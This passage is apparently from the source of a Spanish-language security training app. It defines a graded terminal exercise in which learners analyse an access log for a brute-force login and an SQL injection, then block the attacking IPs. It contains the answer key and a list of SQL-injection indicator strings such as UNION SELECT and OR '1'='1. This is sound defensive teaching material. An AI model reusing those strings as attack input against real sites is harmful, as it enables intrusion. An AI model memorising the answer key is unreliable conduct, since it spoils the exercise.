    { id: 'top_ip', label: 'IP con más peticiones', placeholder: 'ej. 192.0.2.10' },
    { id: 'fail_count', label: 'Intentos fallidos (401) de esa IP', placeholder: 'número' },
    { id: 'sqli_ip', label: 'IP que intentó la inyección SQL', placeholder: 'ej. 192.0.2.10' },
    { id: 'sqli_path', label: 'Recurso atacado por SQLi (sin parámetros)', placeholder: 'ej. /pagina.php' },
  ],
  hintCommands: ["awk '{print $1}' access.log | sort | uniq -c | sort -nr | head", `grep ${BRUTE_IP} access.log | grep -c " 401 "`, 'grep -i "union" access.log', 'ufw deny from IP'],
  evaluate: (s) => {
    const internalBlocked = ['10.0.5.31', '10.0.5.44'].some((ip) => isBlocked(s, ip));
    return result(
      [
        crit('t64-top', `IP con más peticiones: ${BRUTE_IP}`, norm(s.answers.top_ip) === BRUTE_IP, 15,
          'Es la IP del ataque de fuerza bruta: decenas de POST al login.',
          `La IP con más peticiones es ${BRUTE_IP}. Pipeline: awk '{print $1}' access.log | sort | uniq -c | sort -nr | head. uniq -c solo cuenta líneas consecutivas iguales, por eso hay que ordenar antes.`),
        crit('t64-count', `Intentos fallidos: ${BRUTE_FAILS}`, parseInt(s.answers.fail_count ?? '', 10) === BRUTE_FAILS, 15,
          'Contaste solo las respuestas 401 de esa IP.',
          `Son ${BRUTE_FAILS}: grep ${BRUTE_IP} access.log | grep -c " 401 ". El intento 39 devolvió 302 (redirección tras un login exitoso), seguido del acceso a /admin/dashboard.php: la fuerza bruta tuvo éxito.`),
        crit('t64-sqli-ip', `IP de la inyección SQL: ${SQLI_IP}`, norm(s.answers.sqli_ip) === SQLI_IP, 15,
          'Las peticiones con comillas, ORDER BY y UNION SELECT (y el agente sqlmap) delatan la SQLi.',
          `La SQLi viene de ${SQLI_IP}: grep -i "union" access.log. Su user-agent es sqlmap y el error.log muestra un error de sintaxis SQL provocado por esa IP.`),
        crit('t64-sqli-path', 'Recurso atacado: /products.php', norm(s.answers.sqli_path).split('?')[0] === '/products.php', 15,
          'El parámetro id de /products.php se concatena directamente en la consulta.',
          'El recurso vulnerable es /products.php (parámetro id). /var/www/html/products.php concatena $_GET["id"] en la consulta SQL: se corrige con consultas parametrizadas.'),
        crit('t64-block-brute', `${BRUTE_IP} bloqueada`, isBlocked(s, BRUTE_IP), 15, 'La IP de fuerza bruta ya no puede conectarse.', `Falta bloquear ${BRUTE_IP}: ufw deny from ${BRUTE_IP} (ufw está activo) o iptables -A INPUT -s ${BRUTE_IP} -j DROP.`),
        crit('t64-block-sqli', `${SQLI_IP} bloqueada`, isBlocked(s, SQLI_IP), 15, 'La IP de la inyección SQL ya no puede conectarse.', `Falta bloquear ${SQLI_IP}: ufw deny from ${SQLI_IP}.`),
        crit('t64-internal', 'Red interna 10.0.5.0/24 sin bloquear', !internalBlocked, 10, 'Los usuarios internos siguen teniendo acceso.', 'Bloqueaste tráfico de la red interna 10.0.5.0/24: un bloqueo demasiado amplio provoca una denegación de servicio a usuarios legítimos.'),
      ],
      'Análisis completo: atacantes identificados con evidencia del log y bloqueados sin afectar a usuarios legítimos.',
      'Usa tuberías para resumir el log: extraer el campo, ordenar, contar y volver a ordenar.'
    );
  },
  guide: {
    pbqId: 'pbq-64',
    overviewRationale:
      'Un log de acceso tiene miles de líneas: la habilidad que se evalúa es reducirlo con tuberías hasta tener la evidencia (quién, cuántas veces, qué recurso) y actuar en consecuencia.',
    keyTakeaways: [
      'Formato combined de nginx/Apache: IP - usuario [fecha] "MÉTODO RUTA PROTOCOLO" código tamaño "referer" "user-agent".',
      "awk '{print $1}' extrae la IP; sort | uniq -c cuenta; sort -nr ordena de mayor a menor.",
      'grep -c cuenta coincidencias; grep -i ignora mayúsculas; grep -v excluye.',
      '401 = credenciales rechazadas; un 302 tras muchos 401 suele indicar un login exitoso.',
      "Indicadores de SQLi: comillas ('/%27), OR '1'='1, ORDER BY, UNION SELECT, agentes como sqlmap.",
    ],
    itemsGlossary: [
      { name: 'Contar por IP con tuberías', badge: 'awk | sort | uniq -c', definition: 'Extrae el campo, ordena para agrupar, cuenta las repeticiones y ordena el resultado de mayor a menor.', whyCorrectOrRole: 'Identifica el origen más activo en segundos.', distractorWarning: 'uniq -c sin un sort previo cuenta mal: solo agrupa líneas consecutivas.', criteria: ['t64-top'] },
      { name: 'Filtrar y contar', badge: 'grep -c', definition: 'grep filtra las líneas que coinciden; -c devuelve solo la cantidad.', whyCorrectOrRole: 'Encadenar dos grep (IP y código 401) cuenta los fallos de esa IP.', criteria: ['t64-count'] },
      { name: 'Indicadores de inyección SQL', badge: '2.4 Indicadores', definition: 'Caracteres y palabras de SQL en parámetros de la URL, errores de sintaxis SQL en el log de errores y herramientas automatizadas en el user-agent.', whyCorrectOrRole: 'Las peticiones de 192.0.2.66 a /products.php?id= muestran la progresión típica de sqlmap.', criteria: ['t64-sqli-ip', 't64-sqli-path'] },
      { name: 'Bloqueo selectivo', badge: 'ufw / iptables', definition: 'Bloquear solo las IP atacantes, no rangos que incluyan usuarios legítimos.', whyCorrectOrRole: 'ufw deny from IP con ufw activo, o iptables -A INPUT -s IP -j DROP.', distractorWarning: 'Bloquear 10.0.0.0/8 o la red interna corta el acceso a los propios empleados.', criteria: ['t64-block-brute', 't64-block-sqli', 't64-internal'] },
    ],
  },
};

export const TERMINAL_PBQS: TerminalPbqDefinition[] = [PBQ62, PBQ63, PBQ64];
